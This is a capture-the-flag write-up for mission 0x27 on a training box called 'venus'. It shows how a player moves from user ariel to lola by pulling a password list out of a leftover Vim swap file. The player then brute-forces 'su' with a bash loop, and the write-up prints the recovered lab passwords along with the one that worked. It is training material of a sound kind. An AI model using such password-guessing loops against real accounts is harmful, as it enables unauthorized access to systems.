# 0x27
This write-up explains the steps taken to complete mission 0x27, starting from user `ariel` and escalating to `lola`.

## Mission
As usual, read the objective first:
```bash
ariel@venus:~$ cat mission.txt 
################
# MISSION 0x27 #
################

## EN ##
Seems that ariel dont save the password for lola, but there is a temporal file.
```

## Method of solving
We checked the home directory and identified a hidden Vim swap file (.goas.swp). These files often contain unsaved text from an editor session.
```bash
ariel@venus:~$ ls -la
total 48
drwxr-x--- 1 root  ariel  4096 Apr  5  2024 .
drwxr-xr-x 1 root  root   4096 Apr  5  2024 ..
-rw-r--r-- 1 ariel ariel   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 ariel ariel  3523 Nov 25 18:39 .bashrc
-rw-r----- 1 root  ariel 12288 Apr  5  2024 .goas.swp
-rw-r--r-- 1 ariel ariel   807 Apr 23  2023 .profile
-rw-r----- 1 root  ariel    31 Apr  5  2024 flagz.txt
-rw-r----- 1 root  ariel   254 Apr  5  2024 mission.txt
```
```bash
ariel@venus:~$ cat .goas.swp 
k�����}jWD1pad�eb11~teste/goas
           �������snmk[K;qkBjHcaJqkBjHcaJqkBjHcaJ-->VVjqJGRrnfKmcgD-->bnQgcXYamhSDSff-->QsymOOVbzSaKmRm-->cbjYGSvqAsqIvdg-->LkWReDaaLCMDlLf-->DabEJLmAbOQxEnD-->mYhQVLDKdJrsIwG-->d3LieOzRGX5wud6-->EKvJoTBYlwtwFmv-->PEOppdOkSqJZweH-->rSkPlPhymYcerMJ-->GBUguuSpXVjpxLc-->NdnszvjulNellbK-->IaOpTdAuhSjGZnu-->RGBEMbZHZRgXZnu--rxhKeFKveeKqpwp-->cOXlRYXtJWnVQEG-->ppkJjqYvSCIyAhKThats my little DIc with my old and current passw0rds:
```
To extract the passwords, we used `strings` to find printables text, filtered for the arrow pattern with `grep`, and cleaned up the prefix using `sed`.
```bash
ariel@venus:~$ strings .goas.swp | grep "\-->" | sed "s/-->//" > /tmp/ariel.txt
ariel@venus:~$ cat /tmp/ariel.txt
VVjqJGRrnfKmcgD
bnQgcXYamhSDSff
QsymOOVbzSaKmRm
cbjYGSvqAsqIvdg
LkWReDaaLCMDlLf
DabEJLmAbOQxEnD
mYhQVLDKdJrsIwG
d3LieOzRGX5wud6
EKvJoTBYlwtwFmv
PEOppdOkSqJZweH
rSkPlPhymYcerMJ
GBUguuSpXVjpxLc
NdnszvjulNellbK
IaOpTdAuhSjGZnu
RGBEMbZHZRgXZnu
cOXlRYXtJWnVQEG
ppkJjqYvSCIyAhK
```
Since the list was long, we use a bash one-liner to automate the brute-force attempt against the `su` command.
```bash
ariel@venus:~$ while read p; do echo "$p" | timeout 1 su lola 2>/dev/null && echo "SUCCESS: $p" && break; done < /tmp/ariel.txt
SUCCESS: d3LieOzRGX5wud6
```
**Explanation**:
- `while read p; ... done < /tmp/ariel.txt`: Reads each potential password from the temporary file one line at a time.
- `echo "$p" | timeout 1 su lola`: Pipes the password directly into `su` command. `timeout 1` ensures the script doesn't hang if the password prompt waits for input.
- `2>/dev/null`: Suppresses the standard error output to keep the terminal clean.
- `&& echo "SUCCESS: $p" && break`: If the `su` command succeeds, it prints the successful password and stops the loop.

With this password, we logged in as `lola` and get the flag:
```bash
ariel@venus:~$ su - lola
Password: 
lola@venus:~$ id ; whoami
uid=1028(lola) gid=1028(lola) groups=1028(lola)
lola
```


## Key command
`strings .goas.swp | grep "\-->" | sed "s/-->//" > /tmp/ariel.txt`

`while read p; do echo "$p" | timeout 1 su lola 2>/dev/null && echo "SUCCESS: $p" && break; done < /tmp/ariel.txt`

***You are welcome!***
